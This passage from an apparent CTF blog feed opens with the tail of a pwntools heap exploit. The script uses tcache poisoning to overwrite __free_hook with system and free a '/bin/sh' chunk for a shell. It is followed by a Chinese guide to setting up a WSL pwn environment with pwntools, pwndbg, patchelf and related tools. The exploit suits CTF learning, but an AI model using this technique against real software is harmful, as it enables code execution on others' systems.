<span class="n">free_</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">rc</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">_free</span><span class="sh">"</span><span class="p">,</span> <span class="n">free_</span><span class="p">)</span>

<span class="c1"># system
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">free</span><span class="sh">"</span><span class="p">]</span>
<span class="n">system_</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span>
<span class="n">__free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">__free_hook</span><span class="sh">"</span><span class="p">]</span>

<span class="n">offset2</span> <span class="o">=</span> <span class="mi">28</span>

<span class="c1"># tcache poisioning
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
    <span class="nf">free</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span> <span class="c1"># tcache
</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># offset2 + 10 
</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">__free_hook</span><span class="p">))</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">aa</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system_</span><span class="p">))</span>

<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">__free_hook</span><span class="sh">"</span><span class="p">,</span> <span class="n">__free_hook</span><span class="p">)</span>
<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span> <span class="n">system_</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mh">0x32</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[前排提示：1.一些题目没exp       2.由于题目不是一次上完的，所以顺序上可能不完全与当时一致     3.附件在GitHub仓库里有 💓 引导之始(🍼Baby) ```md ⚠ 题目描述 即使引导早已破碎，也请您当上PWN高手。]]></summary></entry><entry><title type="html">从头开始的pwn环境配置</title><link href="https://leakbox258.github.io/blog/2024/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="alternate" type="text/html" title="从头开始的pwn环境配置"/><published>2024-09-08T00:00:00+00:00</published><updated>2024-09-08T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><![CDATA[<h3 id="step0-关于为什么重新配置环境">Step0 关于为什么重新配置环境</h3> <p>   在此之前一直使用的是<strong>Kali镜像 + 虚拟机</strong>的组合，因为kali自称是专精于渗透和测试方面，预安装了许多的有用的工具。但实际操作下来，发现预安装的工具绝大多数都对pwn方向没有太大帮助，很多工具和环境还是需要手动配置，况且无论是vim还是idle编辑器说实话都不是特别好用。 <br/>    但最关键的其实是因为编译器项目要使用wsl，而在虚拟机里使用qemu需要开启<code class="language-plaintext highlighter-rouge">虚拟化 intel vt-x/ept 或 amd-v/rvi</code>选项，而这个选项与wsl所需的Hyper-V相冲突。也就是说写kernel-pwn就没法同时做项目，做项目就没法写kernel-pwn，Hyper-V的开关都需要重启才能生效。<br/>    考虑到wsl + vscode由于没有图形化，效率更上一层，所以写下以下blog记录从头开始的环境配置。</p> <h3 id="step1-vscode--wsl">Step1 vscode + wsl</h3> <p>   略，网上攻略很多。    有一点需要注意，就是wsl和window进行文件交换时，window文件可以直接拖拽到vsCode的文件侧栏里，反之vsCode里的wsl文件无法拖动到windows中，对此可以使用<code class="language-plaintext highlighter-rouge">cp xxx /mnt/小写盘符/xxx</code>将wsl文件交换到windows中，    比如将某个文件放置在桌面上</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp </span>pwn /mnt/c/Users/nobady/pwn
</code></pre></div></div> <p>   其次一点，从windows拖拽到wsl理论的文件默认没有执行权限，记得对必要的文件使用<code class="language-plaintext highlighter-rouge">chmod +x</code>，包括可执行文件以及ld文件。</p> <h3 id="step2-新建一个用户">Step2 新建一个用户</h3> <p>   开启root的远程连接，直接adduser建立一个新用户。这一步单纯是为了获得一个干净的工作区，因为无论cmd还是vscode都是直接以root打开wsl的，本身就没有权限限制。</p> <h3 id="step3-各种杂七杂八的小工具">Step3 各种杂七杂八的小工具</h3> <h6 id="pwntools"> pwntools</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>apt update
<span class="nv">$ </span>apt upgrade
<span class="nv">$ </span>apt <span class="nb">install </span>python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential <span class="nt">-y</span>
<span class="nv">$ </span>python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">--upgrade</span> pip
<span class="nv">$ </span>pip3 <span class="nb">install</span> <span class="nt">--upgrade</span> pwntools
</code></pre></div></div> <p>   哥们sudo坏了，不知道是不是wsl都这样</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, 
possibly rendering your system unusable.
It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. 
Use the --root-user-action option if you know what you are doing and want to suppress this warning.
</code></pre></div></div> <p>   以root身份使用pip3会报如上warning，由于不打算用python做大型项目，选择忽略.<br/>    简单检查一下</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PainTech:/home/pwn# cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
root@PainTech:/home/pwn# checksec 
usage: pwn checksec <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">--file</span> <span class="o">[</span>elf ...]] <span class="o">[</span>elf ...]
root@PainTech:/home/pwn# python3
Python 3.10.12 <span class="o">(</span>main, Jul 29 2024, 16:56:48<span class="o">)</span> <span class="o">[</span>GCC 11.4.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> from pwn import <span class="k">*</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="o">()</span>
</code></pre></div></div> <h6 id="glibc-all-in-one"> glibc-all-in-one</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 示范一下如何安装使用</span>
<span class="nv">$ </span>git clone https://github.com/matrix1001/glibc-all-in-one.git
<span class="nv">$ </span><span class="nb">pushd </span>glibc-all-in-one
<span class="nv">$ </span>python3 update_list
<span class="o">[</span>+] Common list has been save to <span class="s2">"list"</span>
<span class="o">[</span>+] Old-release list has been save to <span class="s2">"old_list"</span>
<span class="nv">$ </span><span class="nb">cat </span>list
2.23-0ubuntu11.3_amd64
2.23-0ubuntu11.3_i386
2.23-0ubuntu3_amd64
2.23-0ubuntu3_i386
2.27-3ubuntu1.5_amd64
2.27-3ubuntu1.5_i386
2.27-3ubuntu1.6_amd64
2.27-3ubuntu1.6_i386
2.27-3ubuntu1_amd64
2.27-3ubuntu1_i386
<span class="c"># i386是32位，amd64是64位</span>
<span class="nv">$ </span>./download 2.23-0ubuntu11.3_amd64
<span class="nv">$ </span><span class="nb">ls </span>libs
2.23-0ubuntu11.3_amd64
</code></pre></div></div> <h6 id="patchelf"> patchelf</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 还是示例</span>
<span class="nv">$ </span>apt-get <span class="nb">install </span>patchelf
<span class="nv">$ </span>patchelf <span class="nt">--set-interpreter</span> ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so targetfile
<span class="nv">$ </span>patchelf <span class="nt">--replace-needed</span> libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 targetfile
<span class="c"># 或者patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so targetfile</span>
<span class="c"># 去file libc.so.6你就知道为什么</span>
</code></pre></div></div> <p>   需要注意一般C程序只需要更改链接器和libc，如果不是C程序就使用<code class="language-plaintext highlighter-rouge">ldd</code>命令查看依赖项，然后再去网上找着配，这会是一个比较繁琐的过程。</p> <h6 id="gdb插件这里选择pwndbg"> gdb插件(这里选择pwndbg)</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/pwndbg/pwndbg
<span class="nv">$ </span>pusd pwndbg
<span class="nv">$ </span>./setup.sh
<span class="nb">sudo</span>: /etc/sudo.conf is world writable
<span class="nb">sudo</span>: /etc/sudo.conf is world writable
<span class="nb">sudo</span>: error <span class="k">in</span> /etc/sudo.conf, line 0 <span class="k">while </span>loading plugin <span class="s2">"sudoers_policy"</span>
<span class="nb">sudo</span>: /usr/libexec/sudo/sudoers.so must be only be writable by owner
<span class="nb">sudo</span>: fatal error, unable to load plugins
<span class="nb">sudo</span>: /etc/sudo.conf is world writable
<span class="nb">sudo</span>: /etc/sudo.conf is world writable
<span class="nb">sudo</span>: error <span class="k">in</span> /etc/sudo.conf, line 0 <span class="k">while </span>loading plugin <span class="s2">"sudoers_policy"</span>
<span class="nb">sudo</span>: /usr/libexec/sudo/sudoers.so must be only be writable by owner
<span class="nb">sudo</span>: fatal error, unable to load plugins
</code></pre></div></div> <p>   这里报错是因为sh脚本中有<code class="language-plaintext highlighter-rouge">sudo</code>，需要修改一下脚本<br/>    （1）7-11行 和 155-159行，注释掉<br/>    （2）查找所有<code class="language-plaintext highlighter-rouge">sudo</code>，然后全部删除<br/>    init完成后提示</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Added <span class="s1">'source /home/pwn/pwndbg/gdbinit.py'</span> to ~/.gdbinit so that Pwndbg will be loaded on every launch of GDB.
</code></pre></div></div> <p>   提示要配置gdb的启动脚本</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">touch</span> ~/.gdbinit <span class="p">;</span> <span class="nb">echo</span> <span class="s1">'source /home/pwn/pwndbg/gdbinit.py'</span> <span class="o">&gt;</span> ~/.gdbinit
</code></pre></div></div> <p>   注意由于是root用户，所以.gdbinit文件位置有所不同<br/>    安装其他插件时，也要配置这个文件，比如<code class="language-plaintext highlighter-rouge"> source /home/pwn/gef/gef.py</code><br/>    如果.gdbinit中路径错误，那么<code class="language-plaintext highlighter-rouge">gdb</code>命令将打开原生gdb，好像不会有错误提示</p> <h6 id="seccomp-tools"> seccomp-tools</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>apt <span class="nb">install </span>gcc ruby-dev
<span class="nv">$ </span>gem <span class="nb">install </span>seccomp-tools
</code></pre></div></div> <h6 id="one_gadget"> one_gadget</h6> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gem <span class="nb">install </span>one_gadget
</code></pre></div></div> <h3 id="step4-qume">Step4 Qume</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>apt-get <span class="nb">install </span>libc6-dev
<span class="nv">$ </span>apt <span class="nb">install </span>qemu-kvm
<span class="c"># 时间比较长，可以考虑换源</span>
</code></pre></div></div> <p>   busybox和kernel就先不考虑了，编译花费的时间过长</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 <span class="nb">install</span> <span class="nt">--upgrade</span> lz4 git+https://github.com/marin-m/vmlinux-to-elf
<span class="c"># 用来抽取vmlinux的妙妙工具</span>
</code></pre></div></div> <h5 id="最后-如果有条件的话-如果性能方面没有特别多的要求-应当弄一个linux实机-或者凑合用vmware提供的虚拟机-而避免使用wsl-很多奇奇怪怪的问题都是wsl本身造成的-包括但不限于部分软件性能甚至不如虚拟机-docker体验极差指往c盘塞10个g的东西而且难以迁移-磁盘占用膨胀极快指存20g的log自己不删-以及往c盘塞几个g的交换区还不知道回收-以及文件组织上和实机和虚拟机不同-找资料非常痛苦">最后, 如果有条件的话, 如果性能方面没有特别多的要求, 应当弄一个linux实机, 或者凑合用VMware提供的虚拟机, 而避免使用wsl.<br/> 很多奇奇怪怪的问题都是wsl本身造成的, 包括但不限于部分软件性能甚至不如虚拟机, Docker体验极差(指往C盘塞10个G的东西而且难以迁移), 磁盘占用膨胀极快(指存20G的log自己不删, 以及往C盘塞几个G的交换区还不知道回收), 以及文件组织上和实机和虚拟机不同, 找资料非常痛苦</h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><category term="env"/><summary type="html"><![CDATA[Step0 关于为什么重新配置环境    在此之前一直使用的是Kali镜像 + 虚拟机的组合，因为kali自称是专精于渗透和测试方面，预安装了许多的有用的工具。但实际操作下来，发现预安装的工具绝大多数都对pwn方向没有太大帮助，很多工具和环境还是需要手动配置，况且无论是vim还是idle编辑器说实话都不是特别好用。    但最关键的其实是因为编译器项目要使用wsl，而在虚拟机里使用qemu需要开启虚拟化 intel vt-x/ept 或 amd-v/rvi选项，而这个选项与wsl所需的Hyper-V相冲突。也就是说写kernel-pwn就没法同时做项目，做项目就没法写kernel-pwn，Hyper-V的开关都需要重启才能生效。    考虑到wsl + vscode由于没有图形化，效率更上一层，所以写下以下blog记录从头开始的环境配置。 Step1 vscode + wsl    略，网上攻略很多。    有一点需要注意，就是wsl和window进行文件交换时，window文件可以直接拖拽到vsCode的文件侧栏里，反之vsCode里的wsl文件无法拖动到windows中，对此可以使用cp xxx /mnt/小写盘符/xxx将wsl文件交换到windows中，    比如将某个文件放置在桌面上 $ cp pwn /mnt/c/Users/nobady/pwn    其次一点，从windows拖拽到wsl理论的文件默认没有执行权限，记得对必要的文件使用chmod +x，包括可执行文件以及ld文件。 Step2 新建一个用户    开启root的远程连接，直接adduser建立一个新用户。这一步单纯是为了获得一个干净的工作区，因为无论cmd还是vscode都是直接以root打开wsl的，本身就没有权限限制。 Step3 各种杂七杂八的小工具  pwntools $ apt update $ apt upgrade $ apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y $ python3 -m pip install --upgrade pip $ pip3 install --upgrade pwntools    哥们sudo坏了，不知道是不是wsl都这样 WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.    以root身份使用pip3会报如上warning，由于不打算用python做大型项目，选择忽略.    简单检查一下 root@PainTech:/home/pwn# cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa root@PainTech:/home/pwn# checksec usage: pwn checksec [-h] [--file [elf ...]] [elf ...] root@PainTech:/home/pwn# python3 Python 3.10.12 (main, Jul 29 2024, 16:56:48) [GCC 11.4.0] on linux Type "help", "copyright", "credits" or "license" for more information. &gt;&gt;&gt; from pwn import * &gt;&gt;&gt; exit()  glibc-all-in-one # 示范一下如何安装使用 $ git clone https://github.com/matrix1001/glibc-all-in-one.git $ pushd glibc-all-in-one $ python3 update_list [+] Common list has been save to "list" [+] Old-release list has been save to "old_list" $ cat list 2.23-0ubuntu11.3_amd64 2.23-0ubuntu11.3_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1.5_amd64 2.27-3ubuntu1.5_i386 2.27-3ubuntu1.6_amd64 2.27-3ubuntu1.6_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 # i386是32位，amd64是64位 $ ./download 2.23-0ubuntu11.3_amd64 $ ls libs 2.23-0ubuntu11.3_amd64  patchelf # 还是示例 $ apt-get install patchelf $ patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so targetfile $ patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 targetfile # 或者patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so targetfile # 去file libc.so.6你就知道为什么    需要注意一般C程序只需要更改链接器和libc，如果不是C程序就使用ldd命令查看依赖项，然后再去网上找着配，这会是一个比较繁琐的过程。  gdb插件(这里选择pwndbg) $ git clone https://github.com/pwndbg/pwndbg $ pusd pwndbg $ ./setup.sh sudo: /etc/sudo.conf is world writable sudo: /etc/sudo.conf is world writable sudo: error in /etc/sudo.conf, line 0 while loading plugin "sudoers_policy" sudo: /usr/libexec/sudo/sudoers.so must be only be writable by owner sudo: fatal error, unable to load plugins sudo: /etc/sudo.conf is world writable sudo: /etc/sudo.conf is world writable sudo: error in /etc/sudo.conf, line 0 while loading plugin "sudoers_policy" sudo: /usr/libexec/sudo/sudoers.so must be only be writable by owner sudo: fatal error, unable to load plugins    这里报错是因为sh脚本中有sudo，需要修改一下脚本    （1）7-11行 和 155-159行，注释掉    （2）查找所有sudo，然后全部删除    init完成后提示 [*] Added 'source /home/pwn/pwndbg/gdbinit.py' to ~/.gdbinit so that Pwndbg will be loaded on every launch of GDB.    提示要配置gdb的启动脚本 $ touch ~/.gdbinit ; echo 'source /home/pwn/pwndbg/gdbinit.py' &gt; ~/.gdbinit    注意由于是root用户，所以.gdbinit文件位置有所不同    安装其他插件时，也要配置这个文件，比如 source /home/pwn/gef/gef.py    如果.gdbinit中路径错误，那么gdb命令将打开原生gdb，好像不会有错误提示  seccomp-tools $ apt install gcc ruby-dev $ gem install seccomp-tools  one_gadget $ gem install one_gadget Step4 Qume $ apt-get install libc6-dev $ apt install qemu-kvm # 时间比较长，可以考虑换源    busybox和kernel就先不考虑了，编译花费的时间过长 pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf # 用来抽取vmlinux的妙妙工具 最后, 如果有条件的话, 如果性能方面没有特别多的要求, 应当弄一个linux实机, 或者凑合用VMware提供的虚拟机, 而避免使用wsl. 很多奇奇怪怪的问题都是wsl本身造成的, 包括但不限于部分软件性能甚至不如虚拟机, Docker体验极差(指往C盘塞10个G的东西而且难以迁移), 磁盘占用膨胀极快(指存20G的log自己不删, 以及往C盘塞几个G的交换区还不知道回收), 以及文件组织上和实机和虚拟机不同, 找资料非常痛苦]]></summary></entry></feed>